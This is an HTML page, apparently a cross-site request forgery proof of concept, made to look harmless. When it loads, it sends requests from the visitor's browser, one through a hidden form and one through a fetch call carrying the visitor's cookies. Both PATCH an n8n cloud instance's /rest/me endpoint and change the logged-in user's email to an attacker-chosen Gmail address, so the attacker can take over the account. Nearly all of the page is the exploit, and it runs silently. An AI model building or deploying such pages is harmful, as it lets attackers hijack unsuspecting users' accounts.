<!DOCTYPE html>
<html>
<head>
    <title>Demo Page</title>
    <style>
        #hiddenFrame {
            width: 0;
            height: 0;
            border: 0;
            display: none;
        }
    </style>
</head>
<body onload="document.getElementById('csrfForm').submit();">
    <h1>Harmless Looking Page</h1>
    
    <!-- Hidden iframe to capture response -->
    <iframe name="hiddenFrame" id="hiddenFrame"></iframe>
    
    <!-- Form that will automatically submit -->
    <form id="csrfForm" action="https://pfelilpe.app.n8n.cloud/rest/me" method="PATCH" target="hiddenFrame" style="display:none;">
        <input type="hidden" name="_method" value="PATCH" />
        <input type="hidden" name="email" value="feliperrupb@gmail.com" />
    </form>
    
    <script>
        // Some browsers may not support method override, so let's also try fetch
        setTimeout(function() {
            fetch('https://pfelilpe.app.n8n.cloud/rest/me', {
                method: 'PATCH',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: 'feliperrupb@gmail.com'
                })
            }).catch(err => console.log('Fetch attempt completed'));
        }, 500);
    </script>
    
    <p>Just a normal page with nothing suspicious...</p>
</body>
</html>
